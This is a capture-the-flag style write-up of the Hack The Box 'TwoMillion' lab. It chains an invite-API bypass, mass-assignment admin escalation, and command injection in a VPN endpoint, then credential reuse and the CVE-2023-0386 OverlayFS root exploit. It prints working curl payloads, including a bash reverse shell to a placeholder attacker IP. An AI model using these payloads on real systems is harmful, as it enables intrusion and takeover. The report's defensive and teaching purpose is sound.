---
layout: writeup
title: "TwoMillion"
platform: HTB
os: "Linux"
date: 2026-03-16
techniques: ["Nmap","Web Enumeration","JavaScript Deobfuscation","API Abuse","Mass Assignment","Command Injection","Credential Reuse","Kernel Privilege Escalation","OverlayFS"]
cve: ["CVE-2023-0386"]
description: "Invite-code abuse led to account creation, mass assignment enabled admin access, command injection in VPN generation provided RCE, credential reuse granted SSH access as admin, and OverlayFS CVE-2023-0386 resulted in root."
---

# TwoMillion - Technical Report

> **Platform:** Hack The Box \
> **Difficulty:** `Easy` \
> **Date:** 2026-03-16 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

> The "TwoMillion" machine exposed a vulnerable legacy Hack The Box-style web platform. Initial access was achieved by abusing the invite-code generation workflow to create an account. After authentication, an insecure administrative API allowed privilege escalation through mass assignment, granting administrator access. An administrative VPN generation endpoint was then found to be vulnerable to command injection, resulting in remote code execution as `www-data`. Sensitive credentials stored in the application `.env` file were reused for the local `admin` account, allowing a user-level pivot. Finally, an outdated Linux kernel was exploited via OverlayFS local privilege escalation (CVE-2023-0386) to obtain full root access. Immediate remediation should focus on removing the vulnerable admin API logic, sanitizing command execution in the VPN generation feature, and updating the kernel.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation
of the **"TwoMillion"** machine on Hack The Box.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow a structured workflow of reconnaissance, enumeration, exploitation, post-exploitation validation, and privilege escalation.

---

## 2. Attack Chain

> One-line summary of the full exploitation path. Fill this in last.

```text
Nmap → Web Enumeration → Invite API Abuse → Account Registration → Admin Mass Assignment → VPN Generation Command Injection → www-data Shell → .env Credential Disclosure → admin Access → OverlayFS CVE-2023-0386 → Root
````

---

## 3. Tools Used

| Tool                                      | Purpose                                        |
| ----------------------------------------- | ---------------------------------------------- |
| `nmap`                                    | Port scanning and service detection            |
| `curl`                                    | Manual HTTP interaction and API testing        |
| `burpsuite`                               | Request interception, API analysis, and replay |
| `gobuster`                                | Directory enumeration                          |
| `CyberChef`                               | Decoding Base64 and ROT13 challenge data       |
| `OpenVPN`                                 | Lab network connectivity                       |
| `netcat`                                  | Reverse shell listener                         |
| `bash`                                    | Reverse shell execution and host interaction   |
| `grep` / `find` / `cat`                   | Local enumeration                              |
| `gcc`                                     | Compiling local privilege escalation exploit   |
| `git` / `wget` / `python3 -m http.server` | PoC retrieval and transfer                     |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**

```bash
nmap -sC -sV 10.129.229.66
```

**Findings:**

| Port | Service | Version              | Notes                                |
| ---- | ------- | -------------------- | ------------------------------------ |
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu | Potential post-exploitation access   |
| 80   | HTTP    | nginx                | Redirected to `http://2million.htb/` |

**Key Observations:**

* The web service redirected requests to the virtual host `2million.htb`.
* Host resolution had to be added manually in `/etc/hosts`.
* The initial attack surface was clearly web-focused.

---

## 5. Service Enumeration

> Analyze each exposed service individually for attack vectors.

### 5.1 Web Enumeration

**Tools Used:** `curl`, `gobuster`, `burpsuite`, manual inspection

**Findings:**

* The landing page mimicked an old Hack The Box platform.
* The `/invite` page contained JavaScript referencing hidden API endpoints.
* Directory enumeration revealed:

  * `/login`
  * `/register`
  * `/invite`
  * `/api`
* Authenticated route discovery later exposed both user and admin API endpoints.

### 5.2 Invite Workflow Analysis

The `/invite` page contained custom JavaScript that referenced:

* `/api/v1/invite/verify`
* `/api/v1/invite/how/to/generate`

Deobfuscation of the JavaScript revealed an additional hidden endpoint:

* `/api/v1/invite/generate`

The invite workflow behaved as follows:

1. `/api/v1/invite/how/to/generate` returned a ROT13-encoded instruction.
2. Decoding the message revealed that a POST request must be sent to `/api/v1/invite/generate`.
3. `/api/v1/invite/generate` returned a Base64-encoded invite code.
4. The decoded invite code allowed registration of a new account.

### 5.3 Authenticated API Enumeration

After account creation and login, `/api/v1` exposed a route list including:

**User Routes**

* `GET /api/v1/user/auth`
* `GET /api/v1/user/vpn/generate`
* `GET /api/v1/user/vpn/regenerate`
* `GET /api/v1/user/vpn/download`

**Admin Routes**

* `GET /api/v1/admin/auth`
* `POST /api/v1/admin/vpn/generate`
* `PUT /api/v1/admin/settings/update`

This route list strongly indicated that administrative functionality was exposed through the same API namespace without sufficient access controls.

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Invite code workflow abuse
**Location:** `/invite` and related API endpoints
**Reasoning:**

The application attempted to hide invite generation logic in client-side JavaScript. Because the frontend disclosed internal endpoints, the full invite-generation flow could be reconstructed and abused without any legitimate invite source.

### 6.2 Exploitation

The invite code was obtained through the following sequence:

```bash
# ROT13 instruction retrieval
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate

# Invite generation
curl -s -X POST http://2million.htb/api/v1/invite/generate
```

The generated Base64 value was decoded to recover a valid invite code, which was then used to create an account through the platform registration workflow.

**Result:** Authenticated web access obtained as `0N1S3C`.

---

## 7. Lateral Movement

**From:** `www-data`
**To:** `admin`

**Method:**

* Extracted application credentials from `/var/www/html/.env`
* Identified database credentials reused as system credentials
* Authenticated as local user `admin`

### 7.1 Administrative API Abuse

Before lateral movement to `admin`, administrative privileges were first obtained inside the web application.

#### Vulnerability Identification

**Vulnerability:** Mass assignment / broken authorization
**Location:** `PUT /api/v1/admin/settings/update`
**Reasoning:**

The endpoint required an `email` parameter, but it also accepted and applied the protected `is_admin` field without validating that the requester already possessed administrative privileges.

#### Exploitation

Baseline check:

```bash
curl -s http://2million.htb/api/v1/admin/auth -H 'Cookie: PHPSESSID=<session>'
```

Response indicated the user was not an administrator.

Privilege escalation request:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  -H 'Cookie: PHPSESSID=<session>' \
  --data '{"email":"0N1S3C@htb.com","is_admin":1}'
```

The response returned the updated user object with `is_admin` set to `1`.

Verification:

```bash
curl -s http://2million.htb/api/v1/admin/auth -H 'Cookie: PHPSESSID=<session>'
```

**Result:** Administrative access obtained in the web application.

### 7.2 Remote Code Execution via Admin VPN Generation

With administrative access established, the endpoint `POST /api/v1/admin/vpn/generate` was tested.

A normal request with a valid username returned a generated `.ovpn` configuration file:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  -H 'Cookie: PHPSESSID=<session>' \
  --data '{"username":"0N1S3C"}'
```

The `username` parameter was then tested for command injection:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  -H 'Cookie: PHPSESSID=<session>' \
  --data '{"username":"0N1S3C;id;"}'
```

This returned command output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A reverse shell was then triggered:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  -H 'Cookie: PHPSESSID=<session>' \
  --data '{"username":"0N1S3C;bash -c '\''bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'\'';"}'
```

Listener:

```bash
nc -lvnp 4444
```

**Result:** Shell obtained as `www-data`.

### 7.3 Pivot to Local User

Sensitive data was then recovered from the application environment file:

```bash
cat /var/www/html/.env
```

This revealed reused credentials:

```text
DB_USERNAME=admin
DB_PASSWORD=<redacted>
```

Those credentials successfully authenticated to the local `admin` account.

**Result:** Access obtained as `admin`.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**

* [x] `sudo -l`
* [x] SUID binaries — `find / -perm -4000 2>/dev/null`
* [ ] Cron jobs — `cat /etc/crontab`
* [ ] Writable files/dirs
* [ ] Capabilities — `getcap -r / 2>/dev/null`
* [ ] Running processes / internal ports
* [ ] Bash history / config files
* [ ] LinPEAS

**Key Findings:**

* `admin` had no useful sudo rights.
* Common SUID enumeration did not reveal an obvious privilege escalation path.
* The kernel version was outdated:

  * `Linux 5.15.70-051570-generic`
  * `Ubuntu 22.04.2 LTS`
* This aligned with public exploitation paths for OverlayFS local privilege escalation.

### 8.2 Escalation Vector

**Vector:** OverlayFS local privilege escalation
**Root Cause:** Vulnerable kernel version affected by CVE-2023-0386

A public proof of concept for CVE-2023-0386 was transferred to the target, compiled, and executed. The exploit created a root-executable file through OverlayFS abuse and yielded a root shell.

```bash
# Compile
gcc fuse.c -o fuse
gcc exp.c -o exp
gcc getshell.c -o getshell
chmod +x fuse exp getshell

# Terminal 1
./fuse ./ovlcap/lower ./gc

# Terminal 2
./exp
```

The exploit completed successfully and spawned a root shell.

**Result:** Root/system-level access achieved.

---

## 9. Findings Summary

| # | Finding                                                                               | Severity    | Location                        |
| - | ------------------------------------------------------------------------------------- | ----------- | ------------------------------- |
| 1 | Invite generation logic exposed through client-side code and internal APIs            | 🟡 Medium   | Web application                 |
| 2 | Administrative settings endpoint vulnerable to mass assignment / broken authorization | 🔴 Critical | `/api/v1/admin/settings/update` |
| 3 | Administrative VPN generation endpoint vulnerable to command injection                | 🔴 Critical | `/api/v1/admin/vpn/generate`    |
| 4 | Sensitive credentials stored in plaintext `.env` and reused for local account access  | 🟠 High     | `/var/www/html/.env`            |
| 5 | Outdated kernel vulnerable to OverlayFS local privilege escalation (CVE-2023-0386)    | 🔴 Critical | Host kernel                     |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

> What would appear in logs / alerts during this attack?

* Repeated POST requests to hidden invite API routes
* Unexpected updates to user administrative attributes through `/api/v1/admin/settings/update`
* Requests to `/api/v1/admin/vpn/generate` containing shell metacharacters
* Reverse-shell outbound connection from the web server process
* Access to `/var/www/html/.env`
* Compilation and execution of local exploit code in `/tmp`

### 10.2 Security Weaknesses

* Sensitive logic relied on obscurity in client-side JavaScript
* Administrative authorization was not enforced correctly server-side
* User input was passed unsafely into command execution context
* Secrets were stored in plaintext inside the web root
* Credential reuse enabled easy pivoting between application and system accounts
* The host kernel was outdated and vulnerable to a known local privilege escalation issue

### 10.3 Hardening Recommendations

| Priority   | Recommendation                                                                                          | Finding                 |
| ---------- | ------------------------------------------------------------------------------------------------------- | ----------------------- |
| Immediate  | Remove or restrict the vulnerable admin API endpoint and enforce server-side authorization checks       | Mass assignment         |
| Immediate  | Eliminate shell-based VPN generation or strictly sanitize and validate all input before use             | Command injection       |
| Immediate  | Rotate all exposed credentials and prohibit password reuse between application and local accounts       | Credential reuse        |
| Short-term | Move secrets out of web-accessible application directories and into secure secret-management mechanisms | Plaintext `.env`        |
| Short-term | Restrict outbound network access for web service accounts where possible                                | Reverse shell execution |
| Long-term  | Maintain current kernel patch levels and implement vulnerability management for host infrastructure     | CVE-2023-0386           |

---

## 11. Lessons Learned

* Hidden JavaScript endpoints are often more valuable than brute-force enumeration when a web app is designed like a puzzle.
* When an API route list is exposed, the fastest path is often to test authorization logic directly rather than overcomplicate enumeration.
* Once RCE is achieved, local privilege escalation frequently becomes a matter of disciplined enumeration: configs, environment files, reused credentials, then kernel version.
* Small misconfigurations chained together can be just as dangerous as a single obvious critical flaw.

---

*End of Report*
*Classification: Public — flags and sensitive values omitted*
